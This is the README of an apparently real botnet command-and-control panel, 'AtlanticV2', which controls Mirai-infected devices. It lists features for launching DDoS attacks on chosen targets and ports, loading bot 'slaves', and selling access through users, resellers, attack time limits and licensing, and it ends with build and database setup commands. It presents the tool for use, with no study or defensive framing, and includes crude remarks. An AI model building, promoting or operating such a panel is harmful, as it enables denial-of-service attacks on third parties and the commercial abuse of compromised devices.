# AtlanticV2
I never thought i'd actually do this, but oh well.

this will be my last project under the Alias virtual (bitches), due to the fact it has alot of controversy.

# Features
- Sessions
    - View sessions
    - Broadcast
        - Prints above the prompter
        - Always in sight
    - MOTD
        - Sends to all users as soon as it's updated
- Users management
    - Usernames
    - Cooldown
    - Banned
    - Admin
    - MaxTime
    - Concurrents
    - Add
    - Remove
    - Edit
    - Password hashing
    - Licensing System
    - MFA Code
- Polymorphic command handler
    - Automatic permissions association and checks
    - File per command
    - Error handling and logging
- UI
    - Tables
    - State of the art
    - Over simplified login
    - Bugless prompt
    - TUI new user prompt
- Shell
    - Reject bad input (e.g. random unicode)
    - Virtual input buffer (edit with backspace)
    - Custom line reader
    - Max length line reader
    - Fast & secure
- Attacks
    - Send to Mirai clients // UPDATE: I'm tired of trying to fix it, fix it yourself man
    - Max time
    - Concurrents
    - Cooldown
    - Logging to a Database
    - Disabling/Enabling attacks
    - Format
        - [method] [target] [time] [port]
- Slave loading
    - Loading Mirai's to the CnC
- Funnel manager
    - API Key changing
    - Uses the same SQL database
    - Can be used for the main CnC (better + more optimized)
- Ported Yami's features onto the CnC
# Markup
- Users
    - <<$id>>: Current user's ID
    - <<$username>>: Current user's name
    - <<$cooldown>>: Current user's cooldown
    - <<$maxtime>>: Current user's maximum attack time
    - <<$maxsessions>>: Current user's maximum sessions
    - <<$expiry>>: Current user's account expiry
- Attacks
    - <<$target>>: User's chosen target
    - <<$time>>: User's chosen attack time
    - <<$port>>: User's chosen port
    - <<$method>>: User's chosen method
- Roles
    - <<$admin>>: Current user's admin status
    - <<$reseller>>: Current user's reseller status
    - <<$vip>>: Current user's VIP status
    - <<$banned>>: Current user's ban status
- Other
    - <<$name>>: Build name
    - <<$powersaving>>: Current user's powersaving status
    - <<$myrunning>>: Current user's running attacks
    - <<$slaves>>: Shows the slave count

# Building the Source
Well it isn't that complex, here I'll run it down within a few commands.

```
apt install git golang mariadb-server mariadb-client apache2 php
git clone https://github.com/AtlanticCNC/Atlantic
cd Atlantic
go build main.go
mysql_secure_installation
SET ROOT PASS (this isn't a command)
mysql -pPASSWORD
create database blissful;
exit;
./main
```

For Redhat's use `yum`, For Arch's use `pacman`

# Funnel
```
basically, run the cnc for the first time, it should set up the MySQL database
After you do, select your webserver of choice, I chose apache2, install php, and put the api in
the folder (/var/www/html) start up Apache, go to the config folder edit the conn.php file
And put in your MySQL root password and there you have it man.
```

# Licensing
Please refer to cryptolens for golang docs to learn how to make licenses.

# Credits
Originally by FB owner of Nosviak, but maintained by Virtual.


# Edit by satyr
Virtual is sexy
